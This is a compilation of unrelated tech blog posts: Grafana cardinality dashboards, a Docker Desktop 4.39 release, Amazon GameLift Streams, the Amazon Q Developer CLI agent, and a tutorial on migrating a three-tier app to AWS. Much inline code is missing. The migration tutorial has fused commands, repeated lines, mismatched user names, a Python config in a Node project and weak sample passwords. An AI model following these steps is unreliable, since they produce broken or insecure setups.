Once both plugins have been installed and the marcusolsson-json-datasource is configured, you can download the cardinality dashboards from the CERN Database and Analytics Group organization on GitHub and import them like you would import any other dashboard [3].

The three cardinality management dashboards you imported will provide valuable insight into your metrics and their cardinality. You will be able to drill down into each metric and analyze its impact on your system.

The screenshot below shows a metric with high cardinality because serial numbers are included as a label. This isn’t ideal, but the dashboard clearly highlights the problematic label.

Hopefully, you now have the cardinality management dashboards set up and can start exploring your own metrics.

I’ve been exploring ways to automate a workflow that notifies users when they’re emitting high-cardinality metrics. I’ve also started looking into a chargeback model for metrics. Exciting stuff — maybe I’ll share an update on my progress soon! 😊

items.title: Desktop 4.39: Smarter AI Agent, Docker Desktop CLI in GA, and Effortless Multi-Platform Builds
items.author: Yiwen Xu
items.content:
Developers need a fast, secure, and reliable way to build, share, and run applications — and Docker makes that easy. With the Docker Desktop 4.39 release, we’re excited to announce a few developer productivity enhancements including Docker AI Agent with Model Context Protocol (MCP) and Kubernetes support, general availability of Docker Desktop CLI, and `platform` flag support for more seamless multi-platform image management.

Docker AI Agent: Smarter, more capable, and now with MCP & Kubernetes

In our last release, we introduced the Docker AI Agent in beta as an AI-powered, context-aware assistant built into Docker Desktop and the CLI. It simplifies container management, troubleshooting, and workflows with guidance and automation. And the response has been incredible: a 9x increase in weekly active users. With each Docker Desktop release, we’re making Docker AI Agent smarter, more helpful, and more versatile across developer container workflows. And if you’re using Docker for GitHub Copilot, you’ll get these upgrades automatically — so you’re always working with the latest and greatest.

Docker AI Agent now supports Model Context Protocol (MCP) and Kubernetes, along with usability upgrades like multiline prompts and easy copying. The agent can now also interact with the Docker Engine to list and clean up containers, images, and volumes. Plus, with access to the Kubernetes cluster, Docker AI Agent can list namespaces, deploy and expose, for example, an Nginx service, and analyze pod logs. 

How Docker AI Agent Uses MCP

MCP is a new standard for connecting AI agents and models to external data and tools. It lets AI-powered apps and agents retrieve data and information from external sources, perform operations with third-party services, and interact with local filesystems, unlocking new and expanded capabilities. MCP works by introducing the concept of MCP clients and MCP Servers, this way clients request resources and the servers handle the request and perform the requested action.

The Docker AI Agent acts as an MCP client and can interact with MCP servers running as containers. When running the command in the terminal or in the Docker Desktop AI Agent window to ask a question, the agent looks for a file in the working directory for a list of MCP servers that should be used when in that context. For example, as a specialist in all things Docker, Docker AI Agent can:

To make MCP adoption easier and more secure, Docker has collaborated with Anthropic to build container images for the reference implementations of MCP servers, available on Docker Hub under the mcp namespace. Check out our docs for examples of using MCP with Docker AI Agent. 

Containerizing apps in multiple popular languages: More coming soon

Docker AI Agent is also more capable, and can now support the containerization of applications in new programming languages including:

  • JavaScript/TypeScript applications using npm, pnpm, yarn and bun;
  • Go applications using Go modules;
  • Python applications using pip, poetry, and uv;
  • C# applications using nuget

Try it out — just ask, “Can you containerize my application?” 

Once the agent runs through steps such as determining the number of services in the project, the language, package manager, and relevant information for containerization, it’ll generate Docker-related assets. You’ll have an optimized Dockerfile, Docker Compose file, dockerignore file, and a README to jumpstart your application with Docker. 

More language and package manager support will be available soon!

Figure 1: Docker AI Agent helps with containerizing your app and shows steps of its work

No need to write scripts, just ask Docker AI Agent

The Docker AI Agent also comes with built-in capabilities such as interfacing with containers, images, and volumes. Instead of writing scripts, you can simply ask in natural language to perform complex operations.  For example, combining various servers, to do complex tasks such as finding and cleaning unused images.

Figure 2: Finding and optimizing unused images storage with a simple ask to Docker AI Agent

Docker Desktop CLI: Now in GA

With the Docker Desktop 4.37 release, we introduced the Docker Desktop CLI controller in Beta, a command-line tool to manage Docker Desktop. In addition to performing tasks like starting, stopping, restarting, and checking the status of Docker Desktop directly from the command line, developers can also print logs and update to the latest version of Docker Desktop. 

Docker meets developers where they work — whether in the CLI or GUI. With the Docker Desktop CLI, developers can seamlessly switch between GUI and command-line workflows, tailoring their workflows to their needs. 

This feature lets you automate Docker Desktop operations in CI/CD pipelines, expedites troubleshooting directly from the terminal, and creates a smoother, distraction-free workflow. IT admins also benefit from this feature; for example, they can use these commands in automation scripts to manage updates. 

Improve multi-platform image management with the new flag 

Containerized applications often need to run across multiple architectures, making efficient platform-specific image management essential. To simplify this, we’ve introduced a flag for , , and . This addition will let developers explicitly select and manage images for specific architectures like ,, and more.

The new –platform flag gives you full control over environment variants when saving or loading. For example, exporting only the linux/arm64 version of an image is now as simple as running:

docker save --platform linux/arm64 -o my-image.tar my-app:latest

Similarly, docker load --platform linux/amd64 ensures that only the variant is imported from a multi-architecture archive, reducing ambiguity and improving cross-platform workflows. For debugging and optimization, docker history --platform provides detailed insights into the build history of a specific architecture.

These enhancements streamline multi-platform development by giving developers full control over how they build, store, and distribute images. 

Docker Desktop 4.39 reinforces our commitment to streamlining the developer experience. With Docker AI Agent’s expanded support for MCP, Kubernetes, built-in capabilities of interacting with containers, and more, developers can simplify and customize their workflow. They can also seamlessly switch between the GUI and command-line, while creating automations with the Docker Desktop CLI. Plus, with the new flag, developers now have full control over how they build, store, and distribute images. 

Less friction, more flexibility — we can’t wait to see what you build next!

items.title: Scale and deliver game streaming experiences with Amazon GameLift Streams
items.author: Donnie Prakoso
items.content:
Since 2016, game developers have been using Amazon GameLift to power games with dedicated, scalable server hosting capable of supporting 100M concurrent users (CCU) in a single game. Responding to customer requests for additional managed compute capabilities beyond game servers, we’re announcing Amazon GameLift Streams — a new capability in Amazon GameLift to help game publishers build and deliver global, direct-to-player game streaming experiences. As part of this announcement, existing capabilities in Amazon GameLift are now known as Amazon Gamelift Servers, continuing to serve hundreds of developers including industry leaders Ubisoft, Zynga, WB Games, and Meta.

Amazon GameLift Streams helps you deliver game streaming experiences at up to 1080p resolution and 60 frames per second across devices including iOS, Android, and PCs. In just a few clicks, you can deploy games built with a variety of 3D engines, without modifications, onto fully-managed cloud-based GPU instances and stream games through the AWS Network Backbone directly to any device with a web browser.

Amazon GameLift Streams helps you distribute your games direct-to-players, without having to invest millions of dollars in infrastructure and software development to build your own service. Players can start gaming in just a few seconds, without waiting for downloads or installs.

Here’s a quick look at Amazon GameLift Streams:

You can use the Amazon GameLift Streams SDK to integrate with your existing identity services, storefronts, game launchers, websites, or newly created experiences such as playable demos, and begin streaming to players. You can monitor active streams and usage from within the AWS console, and seamlessly scale your streaming infrastructure across multiple regions on the AWS global network to reach more players around the world with low-latency gameplay. Amazon GameLift Streams is the only solution that enables you to upload your game content onto fully-managed GPU instances in the cloud and start streaming in minutes, with little or no modification of your code.

Players can access AAA, AA, and indie games on PCs, phones, tablets, smart TVs, or any device with a WebRTC-enabled browser. Amazon GameLift Streams allows you to dynamically scale streaming capacity to match player demand, ensuring you only pay for what you need. You can choose from a selection of GPU instances that offer a range of price performance, and rely on the built-in security of AWS to protect your intellectual property.

To begin using Amazon GameLift Streams, I need an existing Amazon GameLift Streams implementation. I prepare my game files by following the Amazon GameLift Streams documentation.

aws s3 sync my-game-folder s3://my-bucket/my-game-path

The next step is to create an Amazon GameLift Streams application. I navigate to the Amazon GameLift Streams console. This is how the new AWS GameLift Streams console looks:

On the Amazon GameLift Streams console, I choose .

In the , I select the runtime environment for my game application.

Then, I need to select my S3 bucket and folder from the previous step, then set the path to my game’s main executable.

I also have the option to configure the automatic transfer of application-generated log files into a S3 bucket. After I’m done with this configuration, I choose .

After my application setup is completed, I need to create a stream group, a collection of compute resources to run and stream the application. I navigate to in the left navigation pane of the Amazon GameLift Streams console.

On this page, I define a description for my new stream group.

Here, I select the capabilities and pricing of my stream group. Since my application is using Microsoft Windows Server 2022 Base, I make sure to select one of the compatible stream classes.

Next, I need to link with the application I created in the previous step.

On the Configure stream settings page, I can configure additional locations for my stream group, bringing in additional capacity from other AWS Regions. There are two capacity options that I can choose, and . The default capacity setting provides one streaming slot, which is sufficient for initial testing.

Then, I need to review my configuration and choose .

With stream groups configured, I can test my game streaming. I navigate to the Test stream page on the console to launch my application as a stream. I select this stream group and select .

On the next page, I can configure any command line arguments or environment variables to run my application. I don’t need any extra configurations and choose .

Then, I can see that my application is running as expected. I can also interact with my game. This test helps me verify that my game works properly in streaming mode and serves as an initial proof of concept.

After I’ve confirmed everything works, I can integrate the Web SDK into my own website. The Web SDK and AWS Software Development Kit (AWS SDK) with Amazon GameLift Streams APIs help me to embed game streams, similar to what I tested in the console, into any web page I manage.

  •  Amazon GameLift Streams is currently available in the following AWS Regions: US East (Ohio), US West (Oregon), Asia Pacific (Tokyo), Europe (Frankfurt). Additional streaming capacity can also be configured in US East (N. Virginia) and Europe (Ireland).
  • This new capability provides comprehensive tools including service APIs, client streaming SDKs, and AWS CLI for content packaging.

Explore how to streamline your game distribution using Amazon GameLift Streams. Learn more about getting started on the Amazon GameLift Streams page.

(This survey is hosted by an external company. AWS handles your information as described in the AWS Privacy Notice. AWS will own the data gathered via this survey and will not share the information collected with survey respondents.)

items.title: A lightning fast, new agentic coding experience within the Amazon Q Developer CLI
items.author: Brian Beach
items.content:
Earlier today, Amazon Q Developer announced an enhanced CLI agent within the Amazon Q command line interface (CLI). With this announcement, Q Developer brings the latest agentic experience to the CLI that provide a more dynamic, interactive coding experience that works with you, and iteratively makes changes based on your feedback. Amazon Q Developer can now use the information in your CLI environment to help you read and write files locally, query AWS resources write code, or automatically debug issues.

As a developer, I appreciate my Integrated Development Environment (IDE) along with the integrated linters and auto-completion features that help streamline my workflow. The addition of AI assistants, like Amazon Q Developer, have changed the way I work in profound ways. I can discuss best practices with Q Developer in chat, or ask it to refactor a complex method in seconds. I am increasingly using the Amazon Q Developer agents to develop new features, write documentation, generate unit tests, and automate code reviews. These powerful agent capabilities have further transformed how I approach my daily development tasks.

However, as a developer, I spend as much time at the command-line interface (CLI) as I do in the IDE, maybe even more. Tools like the Amazon Web Services (AWS) CLI, Git, package managers, and linters have revolutionized the way I manage infrastructure, automate repetitive tasks, and collaborate with my team. Tools like Docker and Kubernetes have transformed the way I develop and deploy my applications. Looking at the extensions tab in my IDE, I have extensions installed for Maven, Docker, and Vue, but I rarely use them, preferring the flexibility and power of the CLI.

Amazon Q Developer has been available in the CLI for over a year now, and it has become an indispensable part of my daily development routine. The assistant’s ability to provide intelligent command completions that can list my Git branches, Amazon S3 buckets, etc. has saved me countless hours. The chat feature allows me to engage in natural language conversations with Amazon Q Developer, asking it to help me learn how to accomplish specific tasks, while the translate capability seamlessly converts my plain-language prompts into the corresponding shell commands.

While Amazon Q Developer’s CLI capabilities are helpful, I miss the power of the agents I have access to in my IDE. Earlier today, Amazon Q Developer announced an enhanced CLI agent within the Amazon Q CLI. Amazon Q Developer, and the new agent is powered by Amazon Bedrock, as a result, the CLI has the power of Claude 3.7 Sonnet step-by-step reasoning. In addition, the new CLI agent can make use of tools installed on my system including compilers, package managers, and the AWS CLI. Finally, the enhanced CLI supports multi-turn conversations allowing dynamic, back-and-forth conversations with the agent. This enables me to get more work done, faster, without ever leaving the comfort of my preferred command-line environment.

Rather than being constrained by the features and workflows of an IDE, the CLI agent gives me direct access to the underlying tools and commands I need to get my work done. Let’s look at an example.

To see how the CLI agent capabilities work, I’ll walk you through an example. I’m preparing for an internal developer community summit happening in April. I need an application to manage the call for content. The Call for Content application allows community members to propose topics for the summit. I’m going to use the Amazon Q Developer CLI to build the application.

I already have the CLI installed, so I’ll run to begin a new conversation with the agent. Then I will ask Q Developer to “scaffold a new application named using React and Vite, and then commit it to Git.” As you can see in the following video, the agent understands my intent, and carries out the work needed to build the application. In the past, the Q Developer CLI would provide instructions for me to execute. In this new enhanced version, the CLI agent uses the tools installed on my laptop to complete each step for me. I should note that I have disabled confirmations, but Q Developer can prompt me before each action so I can verify it.

The agent is working quickly in that video. So quickly that is hard to keep up. So I broke it down, step-by-step in the following image. The agent begins by calling to create the new app, followed by to add all the dependencies. It then runs a series of commands to create a new repository, add my files, and commit the changes including a descriptive commit message.

Notice that agent is not simply generating files. It is running the same commands that I would have run on my own. However, the CLI agent is doing it much faster, and more accurately than I could have done. The enhanced Amazon Q Developer CLI can use tools, including other command line tools installed on my system, to complete its work. Once Q Developer is done, it provides me a summary of the work it has completed, and suggests next steps. In the following image, you can see that Q Developer is suggesting I run the development server to preview the changes. That is a great suggestion, so I ask Q Developer to start the server and confirm that everything is working.

With the application template running, I’m ready to start building the Call for Content application. The CLI agent supports multi-turn conversations, so I can pick up where we left off. I simply explain my requirements at the command line, and agent begins to generate code. This is what Amazon Q Developer does best. In this example, it needs to update the and files.

Notice that the agent can read and write files on my local system in addition to running commands as we saw in the prior example. So, as Q Developer generates code, the agent can put it in the correct place in my local file system. Once it is done, the agent starts the development server using . I asked it to start the server last time, so it correctly guesses that I will want to check the progress. Just like last time, the agent provides another summary of the changes it made. Personally, I appreciate these periodic summaries. They help me build confidence in the work that Q Developer is doing. I’m not happy with the color of the title. I could ask Q Developer to update it, but I will simply update the file myself. Note that I can edit files on my own while using the CLI. the agent will read files before editing them to check if I have made any changes manually.

The application is looking great! However, it is currently writing it’s output to the console. I never told the agent what to do with the data. I would like the application to write to a DynamoDB table. In fact, I created one already. However, I cannot remember which region the table is in. In the following image, I ask the agent to figure it out for me. Let’s see how it responds.

As you can see in the prior image, the agent is able to think about my vague request, and figure out what to do. It starts by looking in us-east-1. When it can not find the table, it moves to us-west-2 and tries again. The table was in us-west-2, but if it were not, the agent would have continued searching. Q Developer understands how to and AWS resources. Once the agent found the table, it uses to install the DynamoDB SDK, and then updates the application files. Note that the agent actually updated multiple files, but I kept the image simple.

With just a few simple prompts, I was able to use the enhanced CLI agent to collaborate with Q Developer throughout the entire development process. I’ll keep working on the application to add authentication, etc. However I assume you have a good understanding of how the Q Developer CLI works and are eager to get started. So, let’s stop here.

Amazon Q Developer’s new CLI agent has completely transformed the way I approach software development. By bringing the power of an advanced AI assistant directly into my preferred command-line environment, I can now accomplish complex tasks faster than ever before. Q Developer’s natural language understanding and contextual awareness, combined with the CLI agent’s ability to reason and use a wide range of development tools, make it an indispensable part of my daily workflow. Finally, support for multi-turn conversations, enable me to collaborate with, and work along side the agent to get more work done, faster.

If you’re a developer who spends a significant amount of time in the CLI, I highly recommend trying out the Amazon Q Developer’s CLI agent. You can follow the Amazon Q Developer User Guide to install the CLI and start leveraging the new agent capabilities right away, for free. I’m confident it will change the way you work, just as it has for me. Give it a try and let me know what you think!

items.title: Migration of a Three-Tier Application from Local Environment to Cloud Infrastructure
items.author: Marion Colley
items.content:
Most times it’s advisable to run test before deploying them. A three tier application is an application that includes the backend which consists of the code base for the application and any other configurations.

the second part is the frontend which consists of codes and configurations to help make the application look presentable and used by the consumer or users.

The third part is the database this includes any data linked to the application, it saves inputs and gives output, it also creates a memory or cache depending on how the application is configured. There are different databases that can be used depending on application set up snd eorkload, some developers or devops engineers may decide to use relational database which includes mysql, aurora, postgress, oracle and others , or non relational database which consists of dynamodb, amongst others.

Migrating a three-tier application from a local setup to the cloud may seem daunting, but don’t worry! We’ll break it down in the simplest way possible. Imagine we are moving a LEGO house (our application) from our small table (local setup) to a bigger playground (cloud). We’ll use two cloud instances (servers), a single server can also be used, and connect them to an RDS (Relational Database Service).

This is a simple breakdown of the three parts:1.Frontend (UI Layer): The part users see and interact with.

2.Backend (Application Layer): The brain that processes logic and requests.

3.Database (Data Layer): Where all the information is stored

What We Will Do:1.Set up two cloud instances (servers) or a single one for frontend and backend.3.Link the backend to an RDS database.

4.Deploy the app and test it.

The first thing we need to do is install necessary dependences on the locally, these will include:

Step 1: Clone the Repository

First, clone the project from GitHub:

# Install Git if you haven’t alreadysudo apt update && sudo apt install git -y
# Navigate into the project directorycd three-tier-application-project

Step 1: Install Dependencies Locally

This project has a frontend (React), backend (Node.js), and a database (MySQL). Let’s install the required dependencies.

.  — For reverse proxy connection of frontend to backend

check if nginx is installed on your local machine, if not install here

  •  — With permissions to create and manage EC2 instances, RDS, and security groups.

Install Backend Dependencies

# Navigate to the backend foldercd backend
# Install Node.js dependenciesnpm install

Install Frontend Dependencies

# Navigate to the frontend foldercd ../frontend
# Install React dependenciesnpm install

Set Up the Database Locally

You need MySQL installed. If you don’t have it, install it first:

sudo apt updatesudo apt install mysql-server -y

Now, create a new database and user:

# Login to MySQLsudo mysql -u root -p

Run the following SQL commands inside MySQL:

CREATE DATABASE crm_db;CREATE USER 'crm_user'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON crm_db.* TO 'crm_user'@'localhost';
FLUSH PRIVILEGES;

Open your terminal and log in to MySQL as the root user:

Create a user with a secure password using mysql_native_password for authentication as shown:

CREATE USER 'marion'@'localhost' IDENTIFIED WITH mysql_native_password BY 'Password.1';

Create a database named mydatabase:

CREATE DATABASE mydatabase;

Grant all privileges on the mydatabase to the user 'willy':

GRANT ALL PRIVILEGES ON mydatabase.* TO 'marion'@'localhost';

Reload the privilege tables to ensure the changes take effect:

Log in as the new user to verify the access:

Enter the password Password.1, then switch to the new database:

If no errors occur, the user marion has been successfully created and granted access to mydatabase.

STEP 2: Connect the Backend to Database

Change the directory of the three-tier-application to the backend / directory

cd three-tier-application/app

Start the application with the required environment variables

DB_HOST=localhost DB_USER=marion DB_PWD=Password.1 DB_DATABASE=mydatabase npm start

STEP 3: Connect the Frontend to Backend

Change the directory to the frontend directory with the command

build the frontend package with the command below

Now you will see a build directory in this directory, which we will copy to a directory where nginx can access it as shown below

Now you will see a build directory in this directory, which we will copy to a directory where nginx can access it as shown below

now let’s edit the nginx conf file in this directory replacing the location the block to our backend is running on port 4000 and the frontend to the location which we copied our build file () as shown below

Now let’s copy the to the directory and reload nginx to access our frontend application as shown below

Now we access our application on

Then populate the database in the DB-DEMO Top left bar

STEP 4: Export the Database from Local Machine

Run the following command to dump your MySQL database into an SQL file:

mysqldump -u your_local_user -p your_database_name > database_backup.sql
  • your_local_user with your MySQL username.
  • Replace your_database_name with the actual database name.
  • Enter your MySQL password when prompted.

This creates a file called database_backup.sql in your current directory.

STEP FIVE: Copy the SQL File to the Remote EC2 Instance

First of, let’s create a security group for the frontend instance, backend instance and database to connect with one another. as shown below

Then we create an instance that will act as a Bastion Host to the Database RDS.

Use scp (Secure Copy) to transfer the backup file to your EC2 instance with the command

scp -i /path/to/your-key.pem database_backup.sql ubuntu@your-ec2-ip:/home/ubuntu/
  • /path/to/your-key.pem with the path to your private key.
  • Replace your-ec2-ip with your EC2 instance’s public IP.
  • The file will be copied to the /home/ubuntu/ directory on the EC2 instance.

Step 6: Deploy to the Cloud

Now that we’ve tested the application locally, we’ll deploy it to the cloud using EC2 instances and connect them to an RDS database.

We will use AWS EC2 instances, but you can use any cloud provider.

1.1 Create an EC2 Instance

  1. Go to → EC2 → Launch Instance.
  2. Choose an  AMI.
  3. Select an instance type (e.g., t2.micro for free tier).
  4. Configure security group:
  • Allow for remote access.
  • Allow for frontend access.
  • Allow for backend API.

1.2 SSH into the Instance

Once the instance is running, connect using SSH:

ssh -i my-key.pem ubuntu@<instance-ip>

Step 7: Deploy the Backend and Frontend

SSH into the instance and install required software:

Log in to MySQL on the EC2 instance:

mysql -u your_remote_user -p
  • with your MySQL username.
  • Enter your MySQL password when prompted.

Create the database (if it doesn’t exist):

CREATE DATABASE your_database_name;

mysql -h rds-endpoint -u your_remote_user -p your_database_name < /home/ubuntu/database_backup.sql

STEP 8: Connect the Backend on EC2 to Database

Create an EC2 instance for the backend server and install node and nvm then clone the git repo

Clone the Application Code

git clone https://github.com/devopsthepracticalway/three-tier-application-project.gitcd three-tier-application-project

STEP 9: Connect the Frontend on EC2 to Backend

Create and EC2 Instance, Install Nginx for Reverse Proxy , nodejs and nvm

follow the guide in but in this case, instead of using localhost for the backend, we use the private-ip of the backend server as shown

confirm the database content

Now we can access our application on the server on the <public-ip> of the frontend server

and see that our data persist

You’ve successfully migrated your local three-tier application to the cloud using a single server! Now, your app can handle more users, scale efficiently, and benefit from cloud-managed services

Once the instances are running, connect using SSH:

ssh -i my-key.pem ubuntu@<frontend-instance-ip>

Do the same for the backend instance:

Step 2: Deploy the Backend

DATABASE_CONFIG = {    'host': 'your-rds-endpoint.amazonaws.com',    'password': 'yourpassword',}

Step 3: Deploy the Frontend

sudo nano /etc/nginx/sites-available/default

        proxy_pass http://<backend-instance-ip>:5000/;
    }
sudo systemctl restart nginx

python3 test_db_connection.py
